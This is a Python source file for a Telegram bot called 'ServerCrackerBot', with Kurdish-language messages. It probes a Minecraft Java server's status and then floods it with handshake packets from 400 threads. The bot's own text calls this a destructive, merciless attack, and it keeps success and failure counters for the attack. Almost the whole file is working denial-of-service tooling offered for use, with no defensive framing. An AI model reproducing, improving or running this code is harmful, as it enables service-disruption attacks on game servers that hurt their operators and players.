import os
import socket
import threading
import sys
import time
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))

user_states = {}
attack_active = False
attack_stats = {"success": 0, "failed": 0}

def get_minecraft_server_status(host, port=25565):
    """پشکنینی سێرڤەری ماینکرافت و هێناوەی زانیاریی یاریزانان و دۆخەکەی"""
    try:
        ip = socket.gethostbyname(host)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        s.connect((ip, int(port)))

        # دروستکردنی پاکێتی Handshake و Status Request
        host_bytes = host.encode('utf-8')
        port_bytes = int(port).to_bytes(2, 'big')
        
        # Handshake Packet (Protocol version 47 for 1.8+, state = 1 for status)
        handshake = b'\x00' + b'\x2f' + chr(len(host_bytes)).encode('utf-8') + host_bytes + port_bytes + b'\x01'
        packet_handshake = len(handshake).to_bytes(1, 'big') + handshake
        
        # Status Request Packet
        packet_status = b'\x01\x00'

        s.sendall(packet_handshake + packet_status)

        # خوێندنەوەی وەڵامی سێرڤەر
        # خوێندنەوەی درێژی پاکێت
        data_len = 0
        shift = 0
        while True:
            b = s.recv(1)
            if not b:
                break
            val = b[0]
            data_len |= (val & 0x7F) << shift
            if not (val & 0x80):
                break
            shift += 7

        # خوێندنەوەی پاکێتی JSONـی وەڵام
        response_data = b""
        while len(response_data) < data_len:
            packet = s.recv(data_len - len(response_data))
            if not packet:
                break
            response_data += packet

        s.close()

        if response_data:
            # پاکێتەکە بە بايت دەست پێدەکات، دەبێت JSONـی ناوەوە دەربهێنین
            json_str = response_data[1:].decode('utf-8', errors='ignore')
            # هەندێک جار کاراکتەری تری لەگەڵدایە، دەبێت جێگایەک بدۆزینەوە کە JSON دەست پێدەکات
            json_start = json_str.find('{')
            if json_start != -1:
                server_info = json.loads(json_str[json_start:])
                return True, server_info
        return False, "وەڵامێکی نەگونجاو لە سێرڤەرەوە وەرگیرا."
    except Exception as e:
        return False, str(e)

def create_minecraft_packet(host, port):
    host_bytes = host.encode('utf-8')
    port_bytes = int(port).to_bytes(2, 'big')
    handshake_data = b'\x00' + b'\x2f' + chr(len(host_bytes)).encode('utf-8') + host_bytes + port_bytes + b'\x01'
    packet_length = len(handshake_data).to_bytes(1, 'big')
    ping_data = b'\x00'
    ping_length = len(ping_data).to_bytes(1, 'big')
    return packet_length + handshake_data + ping_length + ping_data

def flood_worker(host, port):
    global attack_active, attack_stats
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = host

    packet = create_minecraft_packet(host, port)

    while attack_active:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            s.connect((ip, int(port)))
            for _ in range(20):
                if not attack_active:
                    break
                s.send(packet)
            attack_stats["success"] += 1
        except Exception:
            attack_stats["failed"] += 1
        finally:
            try:
                s.close()
            except:
                pass

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💀 دەربارەی بۆت", callback_data="about_bot")],
        [InlineKeyboardButton("🔥 هێرش بۆ سێرڤەری Minecraft Java", callback_data="start_attack_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "💀 **بەخێربێیت بۆ مەکینەی وێرانکەری ServerCrackerBot!**\n\nفەرموو یەکێک لە بژاردەکانی خوارەوە هەڵبژێرە:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "about_bot":
        about_text = (
            "💀 **دەربارەی ServerCrackerBot:**\n\n"
            "ئەم بۆتە چەکێکی پیشەگەرانە و پەرەپێدراوە بۆ پشکنین و فڵۆدکردنی سێرڤەرەکان (Java Edition).\n\n"
            "⚡️ **تەنها بۆ خاوەن `@ALONE427` کار دەکات!**"
        )
        await query.message.reply_text(about_text)

    elif query.data == "start_attack_menu":
        if user_id != OWNER_ID:
            await query.message.reply_text("💀 تۆ ڕێگەپێدراو نییت!")
            return
        user_states[user_id] = "waiting_ip"
        await query.message.reply_text(
            "🎯 **ئامادەکاری بۆ پشکنین و هێرش:**\n\n"
            "تکایە ناوی دۆمەین یان ئایپی سێرڤەرەکە بنووسە:\n"
            "نموونە: `play.withbao.com`"
        )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active, attack_stats
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        return

    if user_states.get(user_id) == "waiting_ip":
        host = update.message.text.strip().replace("@", "")
        if not host:
            await update.message.reply_text("🔥 هەڵە! تکایە ناوی دۆمەین یان ئایپی دروست بنووسە.")
            return

        port = 25565
        user_states[user_id] = None

        # پشکنینی پێشوەختەی سێرڤەرەکە
        loading_msg = await update.message.reply_text(f"🔍 **سەرقاڵی پشکنینی سێرڤەر (`{host}`) و خوێندنەوەی زانیارییەکانم...**")

        is_online, info = get_minecraft_server_status(host, port)

        if not is_online:
            await loading_msg.edit_text(f"❌ **سێرڤەرەکە ئۆنلاین نییە یان دۆزراوەتەوە!**\nهۆکار: `{info}`")
            return

        # دەرهێنانی زانیارییەکان
        version = info.get("version", {}).get("name", "نەزانراو")
        max_players = info.get("players", {}).get("max", 0)
        online_players = info.get("players", {}).get("online", 0)
        
        # טיپی MOTD (پەیامی سێرڤەر)
        motd_raw = info.get("description", "")
        if isinstance(motd_raw, dict):
            motd = motd_raw.get("text", "")
        else:
            motd = str(motd_raw)

        await loading_msg.edit_text(
            f"✅ **سێرڤەرەکە بە سەرکەوتوویی پشکنرا و دۆزرایەوە!**\n\n"
            f"🎯 **ئامانج:** `{host}:{port}`\n"
            f"📦 **وەشانی سێرڤەر:** `{version}`\n"
            f"👥 **ژمارەی یاریزانانی آنلاین:** `{online_players} / {max_players}`\n"
            f"💬 **پەیامی سێرڤەر (MOTD):** `{motd}`\n\n"
            f"🔥 **ئێستا هێرشی بێبەزەیی بۆڕکان دەستی پێکرد!**"
        )

        attack_active = True
        attack_stats = {"success": 0, "failed": 0}

        threads_count = 400
        for _ in range(threads_count):
            t = threading.Thread(target=flood_worker, args=(host, port))
            t.daemon = True
            t.start()

        await update.message.reply_text(
            f"⏹ بۆ وەستاندنی هێرشەکە، فەرمانی `/stop` بنووسە.\n"
            f"📊 بۆ پشکنینی ڕەوشی هێرش، فەرمانی `/status` بنووسە."
        )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_active
    if update.effective_user.id != OWNER_ID:
        return
    
    attack_active = False
    await update.message.reply_text("⏹ **هێرشەکە بە سەرکەوتوویی ڕاگیرا و مەکینە سارد کرایەوە!**")

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    
    success = attack_stats["success"]
    failed = attack_stats["failed"]
    total = success + failed
    success_rate = (success / total * 100) if total > 0 else 0
    
    status_text = (
        "📊 **پشکنینی ڕەوشی هێرش (Server Status):**\n\n"
        f"✅ هێرش و پەیوەندییە سەرکەوتووەکان: `{success}`\n"
        f"❌ هێرشە سەرنەکەوتووەکان (پچڕاو/ڕەتکراوە): `{failed}`\n"
        f"📈 ڕێژەی سەرکەوتنی هێرشەکە: `{success_rate:.2f}%`\n"
        f"⚡️ دۆخی هێرش: {'🔴 لە کاردایە (Active)' if attack_active else '⚪️ وەستاوە'}"
    )
    await update.message.reply_text(status_text)

def main():
    if not TOKEN or not OWNER_ID:
        print("❌ هەڵە: توکن یان ئایدی خاوەن نەدۆزراوەتەوە لە Secrets!")
        sys.exit(1)
        
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("stop", stop_attack))
    app.add_handler(CommandHandler("status", attack_status))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    print("💀 بۆتی ServerCrackerBot بە سەرکەوتوویی کەوتە کار...")
    app.run_polling()

if __name__ == "__main__":
    main()
